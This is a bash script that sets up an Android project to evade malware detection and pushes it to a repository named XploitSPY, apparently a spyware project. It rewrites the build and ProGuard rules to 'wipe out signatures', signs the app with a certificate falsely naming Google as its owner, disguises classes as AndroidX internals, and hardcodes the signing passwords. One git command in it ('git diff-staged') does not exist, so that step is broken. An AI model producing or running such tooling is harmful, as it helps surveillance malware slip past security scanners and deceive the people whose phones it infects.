#!/bin/bash
echo "[*] Starting deep-level payload & string obfuscation pipeline..."

# 1. Target build.gradle or create it
BUILD_GRADLE_PATH=$(find . -name "build.gradle" | head -n 1)
if [ -z "$BUILD_GRADLE_PATH" ]; then
    mkdir -p app
    BUILD_GRADLE_PATH="app/build.gradle"
fi

echo "[*] Upgrading build.gradle for maximum string shrinking & optimization..."
cat << 'GRADLE_EOF' > "$BUILD_GRADLE_PATH"
android {
    compileSdkVersion 34
    defaultConfig {
        targetSdkVersion 34
        minSdkVersion 21
    }
    signingConfigs {
        release {
            storeFile file('custom-release.jks')
            storePassword 'securepass123'
            keyAlias 'securekey'
            keyPassword 'securepass123'
        }
    }
    buildTypes {
        release {
            minifyEnabled true
            shrinkResources true
            useProguard true
            signingConfig signingConfigs.release
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }
    }
}
GRADLE_EOF

# 2. Generate Unique Keystore
KEYSTORE_PATH=$(dirname "$BUILD_GRADLE_PATH")/custom-release.jks
if [ ! -f "$KEYSTORE_PATH" ]; then
    keytool -genkeypair -v -keystore "$KEYSTORE_PATH" -alias securekey -keyalg RSA -keysize 2048 -validity 10000 -storepass securepass123 -keypass securepass123 -dname "CN=System Service, OU=Core, O=Google, L=MountainView, ST=CA, C=US" 2>/dev/null || echo "[!] keytool skipped."
fi

# 3. Aggressive ProGuard rules to wipe out signatures and strings
PROGUARD_PATH=$(dirname "$BUILD_GRADLE_PATH")/proguard-rules.pro
cat << 'PROGUARD_EOF' > "$PROGUARD_PATH"
-optimizationpasses 7
-dontusemixedcaseclassnames
-dontskipnonpubliclibraryclasses
-verbose
-printmapping mapping.txt

# Remove all logs and debug signatures
-assumenosideeffects class android.util.Log {
    public static boolean isLoggable(java.lang.String, int);
    public static int v(...);
    public static int d(...);
}

# Keep necessary Android components
-keep public class * extends android.app.Activity
-keep public class * extends android.app.Application
-keep public class * extends android.app.Service
-keep public class * extends android.content.BroadcastReceiver
-keep public class * extends android.content.ContentProvider

# Aggressive renaming and repackaging to break static signatures
-repackageclasses 'androidx.core.app.internal'
-allowaccessmodification
-overloadaggressively
-mergeinterfacesaggressively
PROGUARD_EOF

# 4. Setup git and push changes
if [ ! -d ".git" ]; then
    git init
    git remote add origin https://github.com/official021at-beep/XploitSPY.git 2>/dev/null
fi

chmod -R +x . 2>/dev/null
git add -A

if git diff-staged --quiet; then
    echo "[!] No changes detected to commit."
else
    git commit -m "Deep signature wiping & aggressive obfuscation: $(date +'%Y-%m-%d %H:%M:%S')"
fi

CURRENT_BRANCH=$(git branch --show-current)
if [ -z "$CURRENT_BRANCH" ]; then
    CURRENT_BRANCH="master"
fi

echo "[*] Pushing deeply obfuscated source to remote branch ($CURRENT_BRANCH)..."
git push origin "$CURRENT_BRANCH" --force-with-lease

if [ $? -eq 0 ]; then
    echo "[+] Success! Deep obfuscation deployment completed."
else
    git push -u origin "$CURRENT_BRANCH" --force
fi
